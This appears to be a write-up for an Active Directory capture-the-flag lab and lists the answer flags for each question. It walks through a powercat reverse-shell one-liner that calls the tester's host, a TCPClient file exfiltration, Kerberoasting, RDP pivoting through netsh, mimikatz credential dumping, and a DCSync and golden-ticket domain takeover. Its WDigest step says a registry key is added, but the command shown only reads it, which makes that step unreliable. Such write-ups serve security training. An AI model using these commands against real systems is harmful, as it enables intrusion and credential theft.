## Q1. Submit the contents of the flag.txt file on the administrator Desktop of the web server 

Hint for us:
Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. 

Lets start the machine and visit the `uploads` folder...

<img width="600" height="229" alt="Screenshot 2026-02-25 140458" src="https://github.com/user-attachments/assets/fc61a26c-2c3a-46ca-b85e-596c5967ccee" />

http://ip/uploads, there we can find the "antax.aspx" -> login with `admin:My_W3bsH3ll_P@ssw0rd!` it gives us "A Webshell which utilizes PowerShell", now we can directly check for the file or what we can do is we can get a stable revshell which can help us futher to enumerate better:

**Lets Get a Stable Rev shell**

1. Use any tool that you want netcat, powercat...
2. Start the simple http server (in my case I use updog)
```
updog -p 80
```
3. Modify the following command:
```
IEX ((New-Object Net.WebClient).DownloadString('http://10.10.15.43:80/powercat.ps1')); powercat -c 10.10.15.43 -p 443 -e cmd.exe
```
4. Before submitting this command make sure to start a shell handler in my case I use penelope (feel free to use any):
```
python3 penelope.py -p 443
```
5. After this you will gain a proper interactive shell which we will be using for further tasks.

<img width="1902" height="314" alt="image" src="https://github.com/user-attachments/assets/5031d984-5707-4f78-b170-f8118e6b3ac0" />

6. Simply Navigate to the location and find the flag...
```
type c:\Users\Administrator\Desktop\flag.txt
```
**JusT_g3tt1ng_st@rt3d!**

## Q2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer 

1. Transfer the PowerView.ps1 to the traget machine using any method that you want. And import the module
```
Import-Module .\PowerView.ps1
```
2. After importing the module find the users for which we can get the hash:
```
Get-DomainUser * -spn | select samaccountname
```

<img width="721" height="397" alt="image" src="https://github.com/user-attachments/assets/d8d6ee30-0c16-408b-8d5c-d8c721eed050" />

**svc_sql**

## Q3. Crack the account's password. Submit the cleartext value. 
1. Our target is user is svc_sql account now lets gather the hashfor it:
```
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

2. Copy the hash to your kali machine and crack it using:
```
hashcat -m 13100 <file> /usr/share/wordlists/rockyou.txt
```
**lucky7**  

## Q4.  Submit the contents of the flag.txt file on the Administrator desktop on MS01

This one is really very tricky and took a lot of time...

My approach was to get an idea about how svc_sql user is linked with MS01 machine, so i used sharphound and transferred the zip to my kali and uploaded on the bloodhound -> _(if you want you can skip this step)_

1. Transfer the sharphound to the machine using any tool.
2. Then execute the following command:
```
.\SharpHound.exe -c All --zipfilename htbAD
```
3. Transfer the file (this is a bit tricky):
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.43",9001)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes("C:\20260224100619_houded.zip")
$stream.Write($bytes,0,$bytes.Length)
$stream.Close()
$client.Close()
```

4. Make sure you have the httpserver or updog running during this process

5. Then upload the zip to the blood hound and navigate to path finder and search the realtion between these two:

<img width="1852" height="547" alt="image" src="https://github.com/user-attachments/assets/6870a91b-938d-496d-a82d-b121f17e550e" />


6. The svc_sql user has all the rights that is required in order connect to the MS01 machine, but we still lack a lot of info about MS01,

### MS01 Enum:
Find the ip of the machine using the `ping MS01` from the shell that we have obtained it comes out to be 172.16.6.50

Now lets see if there are any open ports, for this I used the following command: 
```
powershell Test-NetConnection 172.16.6.50 -Port 3389
```

The output was `TcpTestSucceeded : True`, this basically means we can RDP on the machine..

**But the question is HOW???**

This can be done by setting up a proxy such that If am I connection to the target machine on port 8000 then it should connect to the machines 3389 port, this can be done by using netsh
```
netsh.exe interface portproxy add v4tov4 listenport=8000 listenaddress=10.129.4.64 connectport=3389 connectaddress=172.16.6.50
```
The upper command means: When someone connects to me on port 8000, forward that traffic to 172.16.6.50:3389.

Now lets rdp to the machine:
```
xfreerdp3 /v:10.129.4.64:8000 /u:svc_sql /p:lucky7 +dynamic-resolution /drive:adtools,/home/offo/adtools 
```
What does the last part of the command do: basically allows you to share the drive on your local kali machine to the target machine, 
`/drive:<share_name>,<local_path>`, and it will look something like this:

<img width="276" height="89" alt="image" src="https://github.com/user-attachments/assets/7285286a-b4d9-4a93-a3d5-b06f32a11c77" />


And then we can find the flag on the Desktop of the user Administrator:
**spn$_r0ast1ng_on_@n_0p3n_f1re**

## Q5. Find cleartext credentials for another domain user. Submit the username as your answer. 

We will navigate to the Users dir, and there we can find an intresting user: Tpetty and its really a very intresting account..


<img width="1790" height="429" alt="image" src="https://github.com/user-attachments/assets/f91b48f1-dcf4-4e03-b237-8c543e9f9472" />

Because we even have DCsync permission on the domain (noice)

**tpetty**

## Q6. Submit this user's cleartext password. 

Through the drive that i mounted when i used the xfreerdp command I transfered the mimikatz, now will execute it:
```
./mimikatz.exe 
privilege::debug 
sekurlsa::logonpasswords
```

This didnt helped, what will we do now is we will add a reg key and will then restart the computer and execute the same commands:
```
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential
```

Afte restarting the computer, execute all the mimikatz commands again, and you will be able to see the clear text password of the user.

**Sup3rS3cur3D0m@inU2eR**


## Q7. What attack can this user perform? 
Answer is simple Dcsync.

## Q8.  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 
We will spawn the shell as user Tpretty,

Then will create the golden ticket and will use that in order to get the flag:
```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```
After this we will try to get the SID of the session, using the following command (make sure to import the PowerView):
```
Get-DomainSID
```

Use mimikatz to create hacker user account in current command prompt console session.
```
kerberos::golden /User:hacker /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /krbtgt:6dbd63f4a0e7c8b221d61f265c4a08a7 /id:500 /ptt
exit  
```

Then in the current session we can get the flag:
```
type \\dc01\c$\Users\Administrator\Desktop\flag.txt
```

<img width="1706" height="577" alt="image" src="https://github.com/user-attachments/assets/32ee4329-6d46-4d5f-88cf-68312b34f964" />

**r3plicat1on_m@st3r!**
